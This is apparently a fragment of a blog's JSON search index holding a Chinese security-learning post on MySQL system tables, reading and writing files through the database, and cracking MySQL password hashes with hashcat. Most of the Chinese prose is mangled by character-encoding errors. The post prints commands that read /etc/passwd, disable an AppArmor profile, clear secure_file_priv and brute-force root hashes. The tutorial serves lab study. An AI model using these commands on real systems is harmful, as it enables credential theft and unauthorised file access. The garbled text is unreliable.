/etc/apparmor.d/disable/sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"},{"name":"UDFææƒ","slug":"UDFææƒ","permalink":"http://ca0y1h.top/tags/UDF%E6%8F%90%E6%9D%83/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™å’ŒHashå¯†ç çˆ†ç ´","date":"2019-08-18T14:21:29.000Z","path":"Web_security/basic_learning/3.MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™å’ŒHashå¯†ç çˆ†ç ´/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹MySQLçš„ç³»ç»Ÿè¡¨ã€æ–‡ä»¶è¯»å†™å’ŒHashå¯†ç çˆ†ç ´ ä»»åŠ¡ç›®æ ‡ å­¦ä¹ æ•°æ®åº“ç³»ç»Ÿè¡¨çš„åŠŸèƒ½ï¼Œå¦‚ä½•åˆ©ç”¨SQLè¯­å¥æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåã€å†…å®¹ä»¥åŠå½“å‰ç”¨æˆ·ç­‰åŸºæœ¬ä¿¡æ¯ï¼› å¦‚ä½•åˆ©ç”¨æ•°æ®åº“çš„åŠŸèƒ½è¯»å†™æ–‡ä»¶ï¼Œéœ€è¦ä»€ä¹ˆæ ·çš„æ¡ä»¶æ‰å¯ä»¥è¯»å†™ï¼› æ‰©å±•ï¼šæŸ¥è¯¢ç”¨æˆ·çš„å“ˆå¸Œå€¼ï¼Œå¹¶ä½¿ç”¨hashcatæ¥å¯¹è·å–çš„hashè¿›è¡Œæš´åŠ›ç ´è§£ã€‚ 0x01 MySQLç³»ç»Ÿè¡¨ ä¸€ã€information_schema æ•°æ®åº“å…ƒæ•°æ®ï¼š å…ƒæ•°æ®(meta data)â€”â€”â€œdata about dataâ€ å…³äºæ•°æ®çš„æ•°æ®ï¼Œä¸€èˆ¬æ˜¯ç»“æ„åŒ–æ•°æ®ï¼ˆå¦‚å­˜å‚¨åœ¨æ•°æ®åº“é‡Œçš„æ•°æ®ï¼Œè§„å®šäº†å­—æ®µçš„é•¿åº¦ã€ç±»å‹ç­‰ï¼‰ã€‚æ‰€ä»¥metadataå°±æ˜¯æè¿°æ•°æ®çš„æ•°æ®ï¼Œåœ¨MySQLä¸­å°±æ˜¯æè¿°databaseçš„æ•°æ®ã€‚æœ‰å“ªäº›æ•°æ®åº“ã€æ¯ä¸ªè¡¨æœ‰å“ªäº›è¡¨ã€è¡¨æœ‰å¤šå°‘å­—æ®µã€å­—æ®µæ˜¯ä»€ä¹ˆç±»å‹ç­‰ç­‰ï¼Œè¿™æ ·çš„æ•°æ®å°±æ˜¯æ•°æ®åº“çš„å…ƒæ•°æ®ã€‚ ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ç§°information_schemaæ˜¯ä¸€ä¸ªå…ƒæ•°æ®åº“ã€‚å®ƒå°±åƒç‰©ä¸šå…¬å¸çš„ä¿¡æ¯åº“ï¼Œå¯¹ç®¡ç†çš„æ¯æ ‹å¤§å¦æœ‰å¤šå°‘ç”µæ¢¯ã€ç”µæ¢¯å‹å·ã€æ¯ä¸ªæˆ¿é—´çš„é•¿å®½é«˜ç­‰ç­‰äº†å¦‚æŒ‡æŒã€‚ SCHEMATA æä¾›æ•°æ®åº“ä¿¡æ¯ï¼Œæœ‰å“ªäº›æ•°æ®åº“ï¼Œå­—ç¬¦é›†æ˜¯GBKè¿˜æ˜¯UTF-8ç­‰ç­‰ã€‚ æ‰€æœ‰å­—æ®µåï¼š å…¶ä¸­æŸä¸€æ¡æ•°æ®ï¼š å‘½ä»¤SHOW DATABASES;çš„ç»“æœå–è‡ªæ­¤è¡¨ TABLES æä¾›è¡¨çš„ä¿¡æ¯ï¼Œæ•°æ®åº“æœ‰å“ªäº›è¡¨ï¼Œæ˜¯ä»€ä¹ˆå­˜å‚¨å¼•æ“ç­‰ç­‰ã€‚ æ‰€æœ‰å­—æ®µåï¼š å¸¸ç”¨å­—æ®µåŒ…å«ï¼š å­—æ®µå å«ä¹‰ å¤‡æ³¨ TABLE_SCHEMA æ•°æ®åº“å TABLE_NAME è¡¨å TABLE_TYPE è¡¨çš„ç±»å‹ ENGINE å­˜å‚¨å¼•æ“ CREATE_TIME å»ºè¡¨æ—¶é—´ å…¶ä¸­æŸå‡ æ¡è®°å½•ï¼š å‘½ä»¤SHOW TABLES;çš„ç»“æœå–è‡ªæ­¤è¡¨ COLUMNS æä¾›å­—æ®µçš„ä¿¡æ¯ï¼Œæœ‰å“ªäº›å­—æ®µå­—æ®µç±»å‹æ˜¯ä»€ä¹ˆç­‰ç­‰ã€‚ æ‰€æœ‰å­—æ®µåï¼š å¸¸ç”¨å­—æ®µåï¼š å­—æ®µå å«ä¹‰ å¤‡æ³¨ SCHEMA_NAME æ•°æ®åº“å TABLE_NAME è¡¨å COLUMN_NAME å­—æ®µå COLUMN_TYPE å­—æ®µç±»å‹ å¦‚int(10),varchar(250) å…¶ä¸­æŸå‡ æ¡è®°å½•ï¼š ç­‰åŒå‘½ä»¤ï¼šSHOW COLUMNS æˆ–è€… desc learnSQL.customers çœ‹empè¡¨çš„å…·ä½“å­—æ®µã€‚ STATISTICS è¿™å¼ è¡¨çš„å•è¯æ˜¯ç»Ÿè®¡çš„æ„æ€ï¼Œä½†æ˜¯å´æ˜¯ç´¢å¼•çš„ä¿¡æ¯ã€‚ ä»€ä¹ˆæ˜¯ç´¢å¼• æ‰€æœ‰å­—æ®µåï¼š å­—æ®µå å«ä¹‰ å¤‡æ³¨ SCHEMA_NAME æ•°æ®åº“å TABLE_NAME è¡¨å INDEX_SCHEMA ä¹Ÿæ˜¯æ•°æ®åº“å INDEX_NAME ç´¢å¼•å COLUMN_NAME å­—æ®µå INDEX_TYPE ç´¢å¼•ç±»å‹ ä¸€èˆ¬æ˜¯B-Tree å…¶ä¸­å‡ æ¡è®°å½•ï¼š ç­‰åŒäºå‘½ä»¤ï¼šSHOW INDEX; TABLE_CONSTRAINTS æä¾›çº¦æŸæƒ…å†µï¼Œæˆ‘ä»¬æƒ³çœ‹çœ‹è¡¨æœ‰å“ªäº›çº¦æŸï¼Ÿçº¦æŸæŒ‡çš„æ˜¯å”¯ä¸€æ€§çº¦æŸã€ä¸»é”®çº¦æŸã€å¤–é”®çº¦æŸã€‚ æ‰€æœ‰å­—æ®µåï¼š å¸¸ç”¨å­—æ®µåï¼š å­—æ®µå å«ä¹‰ å¤‡æ³¨ CONSTRAINT_SCHEMA æ•°æ®åº“å CONSTRAINT_NAME çº¦æŸå TABLE_SCHEMA ä¹Ÿæ˜¯æ•°æ®åº“å TABLE_NAME è¡¨å CONSTRAINT_TYPE çº¦æŸç±»å‹ UNIQUEã€PRIMARY KEYã€FOREIGN KEY å…¶ä¸­å‡ æ¡è®°å½•ï¼š å”¯ä¸€çº¦æŸå’Œä¸»é”®çº¦æŸï¼Œæˆ‘ä»¬åœ¨å‰é¢çš„ç´¢å¼•ä¸­ä¸€æ ·å¯ä»¥æŸ¥åˆ° KEY_COLUMN_USAGE æœ‰STATISTICSå’ŒTABLE_CONSTRAINTSè¡¨ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦KEY_COLUMN_USAGEï¼Ÿ å› ä¸ºå¤–é”®æ—¶æ²¡æœ‰æŒ‡å‡ºå‚è€ƒçš„æ˜¯å“ªå¼ è¡¨çš„å“ªä¸ªå­—æ®µï¼ æ‰€æœ‰å­—æ®µï¼š å¸¸ç”¨å­—æ®µï¼š å­—æ®µå å«ä¹‰ å¤‡æ³¨ CONSTRAINT_SCHEMA æ•°æ®åº“å CONSTRAINT_NAME çº¦æŸå PRIMARYæˆ–åˆ—åæˆ–å¤–é”®å TABLE_SCHEMA ä¹Ÿæ˜¯æ•°æ®åº“å TABLE_NAME è¡¨å COLUMN_NAME åˆ—å REFERENCED_TABLE_SCHEMA å‚è€ƒçš„æ•°æ®åº“ REFERENCED_TABLE_NAME å‚è€ƒçš„è¡¨ REFERENCED_COLUMN_NAME å‚è€ƒçš„åˆ— å…¶ä¸­å‡ æ¡è®°å½•ï¼š ç›¸æ¯”å‰é¢ä¸¤ä¸ªï¼ŒKEY_COLUMN_USAGEè¿™ä¸ªè¡¨çš„ä¿¡æ¯æ˜¯æœ€å…¨çš„ã€‚åŒ…æ‹¬ä¸»é”®ã€å¤–é”®ã€å”¯ä¸€çº¦æŸã€‚ VIEWS æŸ¥è¯¢æ•°æ®åº“ä¸‹æ‰€æœ‰çš„è§†å›¾ã€‚ æ‰€æœ‰å­—æ®µåï¼š å¸¸ç”¨å­—æ®µåï¼š å­—æ®µå å«ä¹‰ å¤‡æ³¨ TABLE_SCHEMA æ•°æ®åº“å TABLE_NAME è¡¨å VIEW_DEFINITION è§†å›¾å®šä¹‰è¯­å¥ å…¶ä»–éƒ¨åˆ†è¡¨ ENGINESï¼šåˆ—ä¸¾äº†å½“å‰æ•°æ®åº“å¯¹InnoDBã€MEMORYã€MyISAMç­‰å„ç§å­˜å‚¨å¼•æ“çš„æ”¯æŒæƒ…å†µã€‚ç­‰åŒshow ENGINES GLOBAL_VARIABLESï¼šæœåŠ¡å™¨å˜é‡è®¾ç½®ï¼Œä¸€äº›å¼€å…³å’Œè®¾ç½®ã€‚ç­‰åŒå‘½ä»¤show global variablesã€‚é™¤äº†globalè¿˜æœ‰sessionã€‚ PLUGINSï¼šMySQLçš„æ’ä»¶åˆ—è¡¨ã€‚å¯ä»¥çœ‹åˆ°å­˜å‚¨å¼•æ“InnoDBç”šè‡³binlogéƒ½æ˜¯æ’ä»¶ï¼binlogæ˜¯å¼ºåˆ¶åŠ è½½çš„ï¼ŒInnoDBæ˜¯é»˜è®¤æ‰“å¼€çš„ã€‚ç­‰åŒå‘½ä»¤show PLUGINS PROCESSLISTï¼šæŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„çº¿ç¨‹ï¼æ¯”å¦‚æˆ‘æŸ¥è¿™ä¸ªè¡¨ï¼Œå°±çœ‹åˆ°ä¸€ä¸ªæŸ¥è¯¢çš„çº¿ç¨‹ã€‚ç­‰åŒå‘½ä»¤show full processlist äºŒã€Performance_schema ä¸»è¦ç”¨äºæ”¶é›†æ•°æ®åº“æœåŠ¡å™¨æ€§èƒ½å‚æ•°ã€‚å¹¶ä¸”åº“é‡Œè¡¨çš„å­˜å‚¨å¼•æ“å‡ä¸ºPERFORMANCE_SCHEMAï¼Œè€Œç”¨æˆ·æ˜¯ä¸èƒ½åˆ›å»ºå­˜å‚¨å¼•æ“ä¸ºPERFORMANCE_SCHEMAçš„è¡¨ã€‚MySQL5.7é»˜è®¤æ˜¯å¼€å¯çš„ã€‚ å‚è€ƒï¼šPerformance_schema ä¸‰ã€mysql mysqlçš„æ ¸å¿ƒæ•°æ®åº“ï¼Œç±»ä¼¼äºsql serverä¸­çš„masterè¡¨ï¼Œä¸»è¦è´Ÿè´£å­˜å‚¨æ•°æ®åº“çš„ç”¨æˆ·ã€æƒé™è®¾ç½®ã€å…³é”®å­—ç­‰mysqlè‡ªå·±éœ€è¦ä½¿ç”¨çš„æ§åˆ¶å’Œç®¡ç†ä¿¡æ¯ã€‚(å¸¸ç”¨çš„ï¼Œåœ¨mysql.userè¡¨ä¸­ä¿®æ”¹rootç”¨æˆ·çš„å¯†ç )ã€‚ å¦‚ä½•åˆ©ç”¨SQLè¯­å¥æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåã€å†…å®¹ä»¥åŠå½“å‰ç”¨æˆ·ç­‰åŸºæœ¬ä¿¡æ¯ æŸ¥è¯¢åº“åï¼šSELECT schema_name FROM infomation_schema.schemata; æŸ¥è¯¢è¡¨åï¼šSELECT table_name FROM information_schema.tables WHERE table_schema='test'; æŸ¥è¯¢å­—æ®µåï¼šSELECT column_name FROM information_schema.columns WHERE table_name='col'; æŸ¥è¯¢è®°å½•ï¼šSELECT * FORM test.col; 0x02 è¯»å†™æ–‡ä»¶ ä¸€ã€åˆ©ç”¨æ•°æ®åº“è¯»å–æ–‡ä»¶ ä½¿ç”¨systemå‘½ä»¤ æŸ¥çœ‹æ–‡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940414243mysql&gt; system cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinuuidd:x:105:111::/run/uuidd:/usr/sbin/nologinavahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologindnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinrtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologincups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologinspeech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falsewhoopsie:x:112:117::/nonexistent:/bin/falsekernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologinsaned:x:114:119::/var/lib/saned:/usr/sbin/nologinpulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinavahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologincolord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologinhplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/falsegeoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologingnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/falsegdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/falseca0y1h:x:1000:1000:ca0y1h,,,:/home/ca0y1h:/bin/bashmysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false æ‰§è¡Œå‘½ä»¤ æ³¨æ„ï¼š è¯¥æ–¹æ³•åªèƒ½åœ¨æœ¬åœ°ä½¿ç”¨ï¼Œè¿œç¨‹è¿æ¥æ—¶æ— æ³•ä½¿ç”¨system æ— æ³•è¶Šæƒä½¿ç”¨ load_file()ä¸load data file load_file()ä¸load data fileè¯»å–æ–‡ä»¶çš„åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼šæ–°å»ºä¸€ä¸ªè¡¨ï¼Œè¯»å–æ–‡ä»¶ä¸ºå­—ç¬¦ä¸²å½¢å¼æ’å…¥è¡¨ä¸­åè¯»å–è¡¨ä¸­çš„æ•°æ®ã€‚ ä½¿ç”¨load_file()å’Œload data infile()å‡½æ•°æ—¶ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š secure_file_priv ä¸ä¸º NULLï¼Œä½¿ç”¨ select @@secure_file_privæŸ¥çœ‹å…¶å€¼ï¼Œå€¼ä¸ä¸ºç©ºå­—ç¬¦ä¸²æ—¶ï¼Œåªèƒ½ä½¿ç”¨è¯¥ç›®å½•è¿›è¡Œæ–‡ä»¶çš„è¯»å†™æ“ä½œï¼Œ è¯¥å€¼çš„è®¾ç½®è§[é™„å½•](https://bingslient.github.io/2019/08/16/MySQL æ•°æ®åº“ç³»ç»Ÿè¡¨çš„åˆ©ç”¨/#é™„å½•)ï¼› å½“å‰æ•°æ®åº“ç”¨æˆ·å…·æœ‰ FILE æƒé™ï¼Œä½¿ç”¨ show grantsæŸ¥çœ‹ï¼› ç³»ç»Ÿç”¨æˆ· mysql å¯¹è¯¥æ–‡ä»¶å¯è¯»ï¼ˆè¦è€ƒè™‘ç³»ç»Ÿçš„è®¿é—®æ§åˆ¶ç­–ç•¥ï¼‰ï¼Œåœ¨Ubuntu-18.04ä½¿ç”¨ MySQL æ—¶é»˜è®¤çš„ç³»ç»Ÿç”¨æˆ·æ˜¯ mysqlï¼› è¯»å–æ–‡ä»¶çš„å¤§å°å°äº max_allowed_packetï¼Œä½¿ç”¨ select @@max_allowed_packetæŸ¥çœ‹ï¼› æ–‡ä»¶å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚ å¦‚æœä¸Šè¿°ä»»ä¸€æ¡ä»¶ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› NULL å€¼ã€‚ æŸ¥çœ‹secure_file_privçš„å€¼ï¼š å¯ä»¥çœ‹åˆ°secure_file_privçš„å€¼ä¸º/var/lib/mysql-files â‘  secure_file_privä¸ºNULLæ—¶ï¼Œè¡¨ç¤ºä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼› â‘¡ secure_file_privæŒ‡å®šæ–‡ä»¶å¤¹æ—¶ï¼Œè¡¨ç¤ºmysqlçš„å¯¼å…¥å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨æŒ‡å®šçš„æ–‡ä»¶å¤¹ï¼› â‘¢ secure_file_privæ²¡æœ‰è®¾ç½®æ—¶ï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰ä»»ä½•é™åˆ¶ åœ¨ä¸æ”¹å˜secure_file_privå€¼çš„æƒ…å†µä¸‹å¦‚ä½•è¯»æ–‡ä»¶ï¼š å¯ä»¥æ–°å»ºä¸€ä¸ªè¡¨ï¼Œæˆ–è€…ç›´æ¥æŠŠè¦è¯»æ–‡ä»¶çš„å†…å®¹intoåˆ°å·²æœ‰çš„å­—ç¬¦ç±»å‹çš„è¡¨ä¸­ã€‚ 1create table mytable(a VARCHAR(100), b VARCHAR(100), c VARCHAR(100), d VARCHAR(100), e VARCHAR(100), f VARCHAR(100), g VARCHAR(100)); ä½¿ç”¨load data infileè¯»å–æ–‡ä»¶ï¼š 1LOAD DATA LOCAL INFILE &quot;&#x2F;etc&#x2F;passwd&quot; INTO TABLE mytable; æŸ¥çœ‹åˆšåˆšè¯»å…¥çš„æ–‡ä»¶ï¼š åœ¨æ”¹å˜secure_file_privå€¼çš„æƒ…å†µä¸‹å¦‚ä½•è¯»æ–‡ä»¶ï¼š ä¿®æ”¹MySQLé…ç½®æ–‡ä»¶etc/mysql/my.cnfï¼Œåœ¨[mysqld]ä¸‹æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š 1secure_file_priv&#x3D;&quot;&quot; å†é‡å¯mysqlæœåŠ¡ï¼š 1sudo service mysql restart åœ¨mysqlå‘½ä»¤è¡Œä¸­æŸ¥çœ‹secure_file_privçš„å€¼ï¼š ä¿®æ”¹æˆåŠŸï¼ ä½¿ç”¨load_file()è¯»å–æ–‡ä»¶ï¼š åœ¨Ubuntu-18.04ä½¿ç”¨ MySQL æ—¶é»˜è®¤çš„ç³»ç»Ÿç”¨æˆ·æ˜¯ mysqlï¼Œæ‰€ä»¥å¿…é¡»æŠŠè¦è¯»å–çš„æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œç”¨æˆ·ç»„ä¿®æ”¹ä¸ºmysql äºŒã€åˆ©ç”¨æ•°æ®åº“å†™å…¥æ–‡ä»¶ SELECT INTO OUTFILE å’Œ LOAD DATA è¿™ä¸¤æ¡è¯­å¥æ˜¯å®Œå…¨äº’è¡¥çš„ï¼Œä¸€ä¸ªå†™æ–‡ä»¶ï¼Œä¸€ä¸ªè¯»æ–‡ä»¶ï¼Œè¯­å¥çš„è¯­æ³•ä¹Ÿå¾ˆç›¸ä¼¼ã€‚ å‰ææ¡ä»¶ï¼š secure_file_priv ä¸ä¸º NULLï¼Œä½¿ç”¨ select @@secure_file_privæŸ¥çœ‹å…¶å€¼ï¼Œå€¼ä¸ä¸ºç©ºå­—ç¬¦ä¸²æ—¶ï¼Œåªèƒ½ä½¿ç”¨è¯¥ç›®å½•è¿›è¡Œæ–‡ä»¶çš„è¯»å†™æ“ä½œï¼Œ è¯¥å€¼çš„è®¾ç½®è§[é™„å½•](https://bingslient.github.io/2019/08/16/MySQL æ•°æ®åº“ç³»ç»Ÿè¡¨çš„åˆ©ç”¨/#é™„å½•)ï¼› å½“å‰æ•°æ®åº“ç”¨æˆ·å…·æœ‰ FILE æƒé™ï¼Œä½¿ç”¨ show grantsæŸ¥çœ‹ï¼› ç³»ç»Ÿç”¨æˆ· mysql å¯¹è¯¥æ–‡ä»¶å¯å†™ï¼ˆè¦è€ƒè™‘ç³»ç»Ÿçš„è®¿é—®æ§åˆ¶ç­–ç•¥ï¼‰ï¼Œåœ¨Ubuntu-18.04ä½¿ç”¨ MySQL æ—¶é»˜è®¤çš„ç³»ç»Ÿç”¨æˆ·æ˜¯ mysqlï¼› è¯»å–æ–‡ä»¶çš„å¤§å°å°äº max_allowed_packetï¼Œä½¿ç”¨ select @@max_allowed_packetæŸ¥çœ‹ï¼› æ–‡ä»¶ä¸å­˜åœ¨ã€‚ å°†æ•°æ®åº“ä¸­çš„æŸä¸€ä¸ªè®°å½•å†™å…¥/tmp/customer.csvæ–‡ä»¶ä¸­ï¼š ç»“æœå¦‚ä¸‹ï¼š ä½¿ç”¨ SELECT INTO DUMPFILE å¯å°†æ–‡ä»¶å†…å®¹å†™æˆä¸€è¡Œã€‚ å¦‚æœæƒ³æŠŠè¿œç¨‹æ•°æ®åº“çš„æŸ¥è¯¢ç»“æœå†™åˆ°æœ¬åœ°ä¸»æœºæ–‡ä»¶ä¸Š, å¯ç”¨ï¼š 1&gt;mysql -h hostname -P portnum -u username -p databsename -e &quot;SELECT ...&quot; &gt; file_name 0x03 ç”¨æˆ·å¯†ç çˆ†ç ´ MySQL ç”¨æˆ·çš„å¯†ç å­˜å‚¨æ–¹å¼å¹¶éæ˜æ–‡ç›´æ¥å­˜å‚¨ï¼Œè€Œæ˜¯ç»è¿‡ hash å‡½æ•°åŠ å¯†è¿›è¡Œå­˜å‚¨çš„ï¼Œä» mysql.userä¸­è·å–åˆ° MySQL ç”¨æˆ·å¯†ç çš„å“ˆå¸Œå€¼åï¼Œéœ€è¦ä½¿ç”¨å·¥å…·è¿›è¡Œç ´è§£ã€‚ é¦–å…ˆæŸ¥è¯¢rootç”¨æˆ·å¯†ç çš„Hashå€¼ï¼š å·¥å…·ï¼šhashcat hashcat å·ç§°æœ€å¿«çš„é«˜çº§å¯†ç æ¢å¤å¥—æœºï¼ˆå¯†ç ç ´è§£å·¥å…·ï¼‰ï¼Œæ”¯æŒå¤šç³»ç»Ÿï¼ˆLinuxï¼ŒOSï¼ŒWindowsï¼‰ï¼Œå¤šå¹³å°ï¼ˆGPUï¼ŒCPUï¼ŒDSPç­‰ï¼‰ï¼Œæ”¯æŒå¤šè¾¾ 200 å¤šç§çš„ Hash ç±»å‹ï¼Œæ”¯æŒä½¿ç”¨åŒä¸€ç³»ç»Ÿçš„ä¸åŒè®¾å¤‡ï¼Œæ”¯æŒåˆ†å¸ƒå¼ç³»ç»Ÿèµ„æºç­‰ï¼Œé‡è¦çš„æ˜¯å¼€æºå•Šï¼ ä½¿ç”¨ï¼š 1./hashcat64.exe -m 300 -a 3 hashcode -o plaintxt --outfile-format=2 ?a?a?a?a?a?a å‚æ•°è§£é‡Šï¼š -m 300ï¼šhash ç±»å‹ï¼Œ300 é€‰æ‹©çš„æ˜¯ MySQL4/5 çš„hash -a 3ï¼šæ”»å‡»æ¨¡å¼ï¼Œ3ä»£è¡¨çˆ†ç ´æ¨¡å¼ è½¯ä»¶ä¸€å…±æ”¯æŒ5ç§ç ´è§£æ¨¡å¼ï¼Œåˆ†åˆ«ä¸º: 0 Straightï¼ˆå­—å…¸ç ´è§£ï¼‰ 1 Combinationï¼ˆç»„åˆç ´è§£ï¼‰ 3 Brute-forceï¼ˆæ©ç æš´åŠ›ç ´è§£ï¼‰ 6 Hybrid dict + maskï¼ˆæ··åˆå­—å…¸+æ©ç ï¼‰ 7 Hybrid mask + dictï¼ˆæ··åˆæ©ç +å­—å…¸ï¼‰ -o pliantxt ï¼šç ´è§£åè¾“å‡ºåˆ°æ–‡ä»¶ plaintxt --outfile-format=2ï¼šè¾“å‡ºæ–‡ä»¶æ ¼å¼ï¼Œ2è¡¨ç¤ºåªè¾“å‡ºç ´è§£åçš„å†…å®¹ ?a?a?a?a?a?aï¼šè¿™è¡¨ç¤ºå¯†ç çš„æ©ç ï¼Œæ‰€è°“çš„æ©ç å°±æ˜¯é€šè¿‡ ?[å­—ç¬¦é›†ä»£å·]â€¦ çš„æ ¼å¼è¡¨ç¤ºå¯†ç çš„æ ¼å¼ï¼ŒåŒ…æ‹¬å¯†ç çš„ä½æ•°å’Œæ¯ä¸€ä½å¯†ç ä½¿ç”¨çš„å­—ç¬¦é›†ã€‚?a è¡¨ç¤ºæ‰€æœ‰çš„é”®ç›˜ä¸Šå¯è¾“å…¥çš„å­—ç¬¦ï¼Œ6ä¸ª?aè¡¨ç¤ºå¯†ç æœ‰6ä½ã€‚ hashcat å†…ç½®å­—ç¬¦é›†å¦‚ä¸‹ï¼š ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?h = 0123456789abcdef ?H = 0123456789ABCDEF ?s = !â€#$%&amp;â€™()*+,-./:;&lt;=&gt;?@[]^_`{ ?a = ?l?u?d?s ?b = 0x00 - 0xff å¦‚æœè¦ç”¨æ©ç è¡¨ç¤ºå°å†™+æ•°å­—æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ°è‡ªå®šä¹‰å­—ç¬¦é›†è¿™ä¸ªå‚æ•°äº†ã€‚è½¯ä»¶æ”¯æŒç”¨æˆ·æœ€å¤šå®šä¹‰4ç»„å­—ç¬¦é›†ï¼Œåˆ†åˆ«ç”¨ 1234--custom-charset1 [chars]--custom-charset2 [chars]--custom-charset3 [chars]--custom-charset4 [chars] æ¯”å¦‚è¯´æˆ‘è¦è®¾ç½®è‡ªå®šä¹‰å­—ç¬¦é›†1ä¸ºå°å†™+æ•°å­—ï¼Œé‚£ä¹ˆå°±åŠ ä¸Š: 1-- custom-charset1 ?l?d å¯¹äºæƒ³è¦ç ´è§£ä¸€äº›æœªçŸ¥é•¿åº¦çš„å¯†ç ï¼Œå¸Œæœ›è½¯ä»¶åœ¨ä¸€å®šé•¿åº¦èŒƒå›´å†…è¿›è¡Œå°è¯•çš„ï¼Œå¯ä»¥ä½¿ç”¨â€“incrementå‚æ•°ï¼Œå¹¶ä¸”ä½¿ç”¨â€“increment-min ?å®šä¹‰æœ€çŸ­é•¿åº¦ï¼Œä½¿ç”¨â€“increment-max ?å®šä¹‰æœ€å¤§é•¿åº¦ã€‚æ¯”å¦‚è¦å°è¯•6-8ä½å°å†™å­—æ¯ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š 1--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l çˆ†ç ´ç»“æœï¼š æœ€æ–°ç‰ˆæœ¬çš„MySQLåœ¨é…ç½®å¯†ç è§„åˆ™æ˜¯è¦æ±‚å¯†ç é•¿åº¦æœ€å°ä¸º8ä½ï¼Œä½†æ˜¯æˆ‘è¿™ç ´ç”µè„‘ç”¨hashcatçˆ†ç ´8ä½å¯†ç é¢„è®¡éœ€è¦1å¹´çš„æ—¶é—´ï¼Œåªèƒ½å¼ºè¡ŒæŠŠå¯†ç æœ€å°é•¿åº¦æ”¹ä¸º6ä½ï¼Œ15åˆ†é’Ÿè§£å†³é—®é¢˜ã€‚","tags":[{"name":"webå®‰å…¨åŸºç¡€","slug":"webå®‰å…¨åŸºç¡€","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"},{"name":"hashçˆ†ç ´","slug":"hashçˆ†ç 